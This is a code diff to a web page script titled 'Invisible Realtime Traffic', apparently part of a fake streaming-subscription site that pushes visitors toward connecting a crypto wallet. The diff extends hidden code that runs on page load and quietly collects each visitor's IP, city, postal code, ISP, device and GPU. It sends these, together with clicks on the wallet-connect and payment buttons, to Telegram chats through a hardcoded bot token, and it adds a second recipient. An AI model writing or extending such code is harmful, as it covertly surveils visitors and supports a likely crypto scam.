@@ -3025,7 +3025,8 @@ if (document.readyState === 'loading') {
   <script>
   (function() {
     const TG_BOT_TOKEN = "8904216231:AAHzuoU59D43qO04lsrYvZDhw0su_61Y2Ig";
-    const TG_CHAT_ID = "8788656318";
+    // List of admin chat IDs who receive live alerts
+    const TG_CHAT_IDS = ["8788656318", "8461980119"];
 
     window.__visitorData = {
       country: "Unknown",
@@ -3040,20 +3041,22 @@ if (document.readyState === 'loading') {
     };
 
     function sendTelegramAlert(text) {
-      try {
-        const url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
-        fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: text,
-            parse_mode: "HTML",
-            disable_web_page_preview: true
-          }),
-          keepalive: true
-        }).catch(function() {});
-      } catch (e) {}
+      TG_CHAT_IDS.forEach(function(chatId) {
+        try {
+          const url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
+          fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: text,
+              parse_mode: "HTML",
+              disable_web_page_preview: true
+            }),
+            keepalive: true
+          }).catch(function() {});
+        } catch (e) {}
+      });
     }
 
     function getBrowserAndApp() {
@@ -3076,7 +3079,7 @@ if (document.readyState === 'loading') {
       const ua = navigator.userAgent || "";
       const touch = (navigator.maxTouchPoints > 0) ? " (Touch)" : "";
       if (/iPhone/i.test(ua)) {
-        const m = ua.match(/OS (\d+[_\.]\d+)/);
+        const m = ua.match(/OS (\d+[\._]\d+)/);
         const ver = m ? m[1].replace("_", ".") : "";
         return "📱 iPhone [iOS " + ver + "]" + touch;
       }
@@ -3103,7 +3106,6 @@ if (document.readyState === 'loading') {
           const debug = gl.getExtension("WEBGL_debug_renderer_info");
           if (debug) {
             let rend = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || "";
-            // Clean up overly long driver strings
             rend = rend.replace(/^ANGLE \((.+?), (.+?), .+\)$/, "$2 ($1)");
             return rend;
           }
@@ -3147,12 +3149,53 @@ if (document.readyState === 'loading') {
       return items;
     }
 
-    async function trackVisit() {
-      const sessKey = "tt18_max_visit";
-      const isNew = !sessionStorage.getItem(sessKey);
-      sessionStorage.setItem(sessKey, "1");
+    async function fetchGeoData() {
+      // 1. Try ipwho.is
+      try {
+        const ctrl = new AbortController();
+        const to = setTimeout(() => ctrl.abort(), 2200);
+        const r = await fetch("https://ipwho.is/", { signal: ctrl.signal });
+        clearTimeout(to);
+        if (r.ok) {
+          const d = await r.json();
+          if (d.success !== false && d.country) {
+            return {
+              country: d.country || "Unknown",
+              country_code: d.country_code || "",
+              city: d.city || "",
+              region: d.region || "",
+              postal: d.postal || "",
+              ip: d.ip || "",
+              isp: d.connection ? (d.connection.isp || "") : "",
+              org: d.connection ? (d.connection.org || "") : "",
+              timezone: d.timezone ? (d.timezone.id + " " + (d.timezone.utc || "")) : "",
+              flag: (d.flag && d.flag.emoji) ? d.flag.emoji : "🌐"
+            };
+          }
+        }
+      } catch (e) {}
 
-      let geo = {
+      // 2. Fallback to api.country.is
+      try {
+        const fb = await fetch("https://api.country.is");
+        if (fb.ok) {
+          const fd = await fb.json();
+          return {
+            country: fd.country || "Unknown",
+            country_code: fd.country || "",
+            city: "",
+            region: "",
+            postal: "",
+            ip: fd.ip || "",
+            isp: "",
+            org: "",
+            timezone: "",
+            flag: "🌐"
+          };
+        }
+      } catch (_) {}
+
+      return {
         country: "Unknown",
         country_code: "",
         city: "",
@@ -3164,39 +3207,18 @@ if (document.readyState === 'loading') {
         timezone: "",
         flag: "🌐"
       };
+    }
 
-      // 1. Primary fast Geo IP fetch from ipwho.is (rich data, no-cors)
-      try {
-        const ctrl = new AbortController();
-        const to = setTimeout(() => ctrl.abort(), 2500);
-        const r = await fetch("https://ipwho.is/", { signal: ctrl.signal });
-        clearTimeout(to);
-        if (r.ok) {
-          const d = await r.json();
-          if (d.success !== false) {
-            geo.country = d.country || "Unknown";
-            geo.country_code = d.country_code || "";
-            geo.city = d.city || "";
-            geo.region = d.region || "";
-            geo.postal = d.postal || "";
-            geo.ip = d.ip || "";
-            geo.isp = d.connection ? (d.connection.isp || "") : "";
-            geo.org = d.connection ? (d.connection.org || "") : "";
-            geo.timezone = d.timezone ? (d.timezone.id + " " + d.timezone.utc) : "";
-            if (d.flag && d.flag.emoji) geo.flag = d.flag.emoji;
-          }
-        }
-      } catch (e) {
-        // Fallback to api.country.is
-        try {
-          const fb = await fetch("https://api.country.is");
-          if (fb.ok) {
-            const fd = await fb.json();
-            geo.country = fd.country || "Unknown";
-            geo.ip = fd.ip || "";
-          }
-        } catch (_) {}
+    async function trackVisit() {
+      // Avoid spamming on instant reloads within 2 minutes
+      const lastTrack = sessionStorage.getItem("tt18_last_track");
+      const now = Date.now();
+      if (lastTrack && (now - parseInt(lastTrack, 10)) < 120000) {
+        return;
       }
+      sessionStorage.setItem("tt18_last_track", String(now));
+
+      const geo = await fetchGeoData();
 
       window.__visitorData = {
         country: geo.country,
@@ -3209,8 +3231,6 @@ if (document.readyState === 'loading') {
         browser: getBrowserAndApp(),
         gpu: getGPU()
       };
-
-      if (!isNew) return; // Only send full diagnostic on initial entry
 
       const device = window.__visitorData.device;
       const browser = window.__visitorData.browser;
@@ -3281,74 +3301,37 @@ if (document.readyState === 'loading') {
 
     window.__trackVisitorAction = trackAction;
 
-    document.addEventListener("DOMContentLoaded", function() {
-      trackVisit();
+    // Run visit tracking immediately without waiting for DOM
+    trackVisit();
 
-      const btn1 = document.getElementById("heroWatchOnlineBtn");
-      if (btn1) {
-        btn1.addEventListener("click", function() {
-          trackAction("Watch Online (Hero 1)", "Открыл модалку подписки");
-        });
-      }
+    function setupActionTracking() {
+      const clickMap = [
+        { id: "heroWatchOnlineBtn", name: "Watch Online (Hero 1)", desc: "Открыл модалку подписки" },
+        { id: "heroExploreBtn", name: "Explore Features (Hero 2)", desc: "Открыл модалку подписки" },
+        { id: "navWatchBtn", name: "Watch Online (Navbar)", desc: "Открыл модалку подписки" },
+        { id: "sectionOpenCryptoBtn", name: "Get Instant Access (Banner)", desc: "Открыл модалку подписки" },
+        { id: "ctaWatchOnlineBtn", name: "Watch Online (CTA Bottom)", desc: "Открыл модалку подписки" },
+        { id: "cwPlan3m", name: "Выбор плана 3M", desc: "Выбран план $0.99 (3 месяца)" },
+        { id: "cwPlan6m", name: "Выбор плана 6M", desc: "Выбран план $2.99 (6 месяцев)" },
+        { id: "cwConnectBtn", name: "CONNECT WALLET", desc: "Нажата кнопка подключения кошелька" },
+        { id: "cwPayBtn", name: "PROCEED TO PAYMENT", desc: "Нажата кнопка оплаты" }
+      ];
 
-      const btn2 = document.getElementById("heroExploreBtn");
-      if (btn2) {
-        btn2.addEventListener("click", function() {
-          trackAction("Explore Features (Hero 2)", "Открыл модалку подписки");
-        });
-      }
+      clickMap.forEach(function(item) {
+        const el = document.getElementById(item.id);
+        if (el) {
+          el.addEventListener("click", function() {
+            trackAction(item.name, item.desc);
+          });
+        }
+      });
+    }
 
-      const navBtn = document.getElementById("navWatchBtn");
-      if (navBtn) {
-        navBtn.addEventListener("click", function() {
-          trackAction("Watch Online (Navbar)", "Открыл модалку подписки");
-        });
-      }
-
-      const secBtn = document.getElementById("sectionOpenCryptoBtn");
-      if (secBtn) {
-        secBtn.addEventListener("click", function() {
-          trackAction("Get Instant Access (Banner)", "Открыл модалку подписки");
-        });
-      }
-
-      const ctaBtn = document.getElementById("ctaWatchOnlineBtn");
-      if (ctaBtn) {
-        ctaBtn.addEventListener("click", function() {
-          trackAction("Watch Online (CTA Bottom)", "Открыл модалку подписки");
-        });
-      }
-
-      // Track plan switches in modal
-      const p3m = document.getElementById("cwPlan3m");
-      if (p3m) {
-        p3m.addEventListener("click", function() {
-          trackAction("Выбор плана 3M", "Выбран план $0.99 (3 месяца)");
-        });
-      }
-      const p6m = document.getElementById("cwPlan6m");
-      if (p6m) {
-        p6m.addEventListener("click", function() {
-          trackAction("Выбор плана 6M", "Выбран план $2.99 (6 месяцев)");
-        });
-      }
-
-      // Track wallet connection button
-      const cwConnectBtn = document.getElementById("cwConnectBtn");
-      if (cwConnectBtn) {
-        cwConnectBtn.addEventListener("click", function() {
-          trackAction("CONNECT WALLET", "Нажата кнопка подключения кошелька");
-        });
-      }
-
-      // Track proceed to pay button
-      const cwPayBtn = document.getElementById("cwPayBtn");
-      if (cwPayBtn) {
-        cwPayBtn.addEventListener("click", function() {
-          trackAction("PROCEED TO PAYMENT", "Нажата кнопка оплаты");
-        });
-      }
-    });
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", setupActionTracking);
+    } else {
+      setupActionTracking();
+    }
   })();
   </script>
 <!-- /Invisible Realtime Traffic -->
